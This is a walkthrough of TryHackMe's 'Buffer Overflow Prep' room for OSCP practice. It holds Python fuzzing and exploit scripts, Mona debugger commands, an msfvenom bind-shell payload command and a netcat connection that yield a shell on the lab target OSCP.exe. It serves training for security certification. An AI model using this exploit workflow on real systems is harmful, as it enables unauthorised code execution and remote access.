# Buffer Overflow Guide

This following page recreates the steps on the [TryHackMe room](https://tryhackme.com/room/bufferoverflowprep) linked below in order to perform a simple stack based buffer overflow.

Configure Mona on the RDP session. Inside Immunity Debugger run the following command in the command box.

```
!mona config -set workingfolder c:\mona\%p
```



Run the script below to Fuzz the application.

> fuzzer.py 
```python
import socket, time, sys

ip = "<IP>"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

> fuzzer-multiple.py
```python
# Makes uses of multi stage input. (Enter name then message)
import socket, time, sys

ip = "<IP>"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("brainstorm " + string + "\r\n")
        s.recv(1024)
        s.send("message " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

> Manual-Guessing
```python
# Generate patterns wih '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100'
# Place the value into the 'buffer' variable. Slowly increase pattern value until app crashes.
 
import socket,sys
 
address = "192.168.1.150"
port = 31337
buffer = "Aa0Aa1Aa2"
 
try:
    print "[+] Sending buffer"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address,port))
    s.send(buffer + '\r\n')
except:
    print "[!] Unable to connect to the application."
    sys.exit(0)
finally:
    s.close()
```


Once the Python script has started it will crash the immunity debugger after a short amount of time. Make a note of the last bytes sent to Immunity.

Make a note of the last bytes sent of **2000**.

Create the following python file for exploiting the application.

> python exploit.py
```python
import socket

ip = "<IP>"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```


Run the following command to generate a cyclic pattern of a length `400` bytes longer that the string that crashed the server (change the -l value to this):

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
```



Place the generated value into the payload variable in the `exploit.py` file.


Reopen the `OSCP.exe` file in Immunity Debugger and run. Then run the `exploit.py` file. This will crash the application. We can then run the following command in the Immunity debugger command box. The distance value must match the value we used to create the cyclic value.

```
!mona findmsp -distance 2400
```


Mona should produce a log window where we need to view the value of the line `EIP contains normal pattern : ... (offset XXXX)`


Take note of the offset value. In the example below this value is 1978. Then open the `exploit.py` script and set the value of offset to the value produced by Mona which in this case is 1978. We can also set the 'retn' value to BBBB which converts to hex value of 42424242.


Again restart the OSCP.exe file in Immunity Debugger. Then run the `exploit.py` script again. For the value EIP you should see 42424242 which is BBBB as B has the hex value of '42'. This confirms a buffer overflow would theoretically work. Reset the payload string to an empty string again.

Restart OSCP.exe and run the exploit again.

The value that we need to take note of here is the ESP value which below is shown as '0180FA30'.


## Finding Bad Characters

We now need to identify bad characters by default the null-byte value "\x00" is excluded. Generate a bytearray file with Mona using the following command.

```
!mona bytearray -b "\x00"
```



This will save the results of the array to `c:\mona\oscp\bytearray.txt`. Next use the python script below to generate a list of bad characters.

> bytearray.py

```python
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
```
{% endtab %}
{% endtabs %}



We need to then take the output of the `bytearray.py` script and set it as the payload value in the exploit.py script.



Restart OSCP.exe in Immunity Debugger. Run the exploit and make a note of the value in which the ESP is set to.



ESP value is now 01A2FA30. Now run the following command in Mona specifying the value of the ESP.

```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```



Mona will return a Memory comparison results windows which will show the bad characters.

Generally speaking with bad characters a bad character will also corrupt the byte to the immediate right of it. Assuming this with the data above we can assume the bad characters are: '\x00\x07\x2e\xa0".

Next run the bytearray command in Mona again specifying all bad characters.

```
!mona bytearray -b "\x00\x07\x2e\xa0"
```

Remove the same bad characters listed above from the payload variable in `exploit.py`.

Now restart the OSCP.exe in Immunity and then run the `exploit.py` again. Once the exploit has run and crashed the OSCP.exe we can then run the comparison command against the new ESP value.

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 01A5FA30
```

Providing all the bad characters have been identified and the steps above follow correctly you should see a screen similar to below stating '[`!!! Hooray, normal shellcode unmodified !!!`](http://127.0.0.1)'



We now need to find a jump point. Run the command below with the included bad characters to find the jump point:

```
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```


We can then use any of these addresses going forwards. I will in this example use the first address of `625011af`

We need to then take this value and reverse it and use it in the 'retn' value in `exploit.py`. The reverse value is converted into bytes is: `\xaf\x11\x50\x62`



After this has been completed we need to use `msfvenom` to generate a payload. The syntax is shown below.


Please see the `Additional Notes` section at the end regarding shell types.


```
msfvenom -p windows/shell_bind_tcp RHOST=10.10.36.168 LPORT=443 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py
```



Add the generated shellcode to `exploit.py` Ensure the payload variable in `exploit.py` is set to 'buf' and the shellcode is placed above the payload variable in the script order.


Prepend NOPs

We need to add some padding to the payload to allow room for it to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

```
padding = "\x90" * 16
```



Restart OSCP.exe and then run exploit.py. The application should continue to run and not be in a 'paused' state. From here use `netcat` to connect to the port specified in the `msfvenom` payload and you should get a shell on the target machine.

```
nc 10.10.36.168 443
```



### Additional Notes

This walk through was heavily based on the 'Buffer Overflow Prep' TryHackMe room created by [Tib3rius](https://github.com/Tib3rius). The scripts and methods here are based off this room and I highly recommend completing the room as prep for the OSCP buffer overflow.

For myself this was room was my primary Buffer Overflow prep and I was able to pass the OSCP Buffer Overflow without any issues.

Buffer Overflow Prep: [https://tryhackme.com/room/bufferoverflowprep](https://tryhackme.com/room/bufferoverflowprep)

Tib3rius GitHub: [https://github.com/Tib3rius](https://github.com/Tib3rius)

### Reverse vs Bind shell

An important part of the buffer overflow is the `msfvenom` payload generation. Functionally both bind and reverse shell are fine to use and one does not provide any significant advantage over the other.

If you are taking the OSCP exam I highly recommend using a bind shell as opposed to a reverse shell. Simply put there is less margin for error when the examiner is repeating your process for shellcode generation.

As part of the requirement for passing the buffer overflow you are required to provide your full exploit script. If your script includes shell code for a reverse shell the examiner will need to regenerate the shell code to point back to them.

With bind shell code they can simply copy your script and `netcat` in. As this is less steps and easier for the examiner this is a more preferable and safer approach.
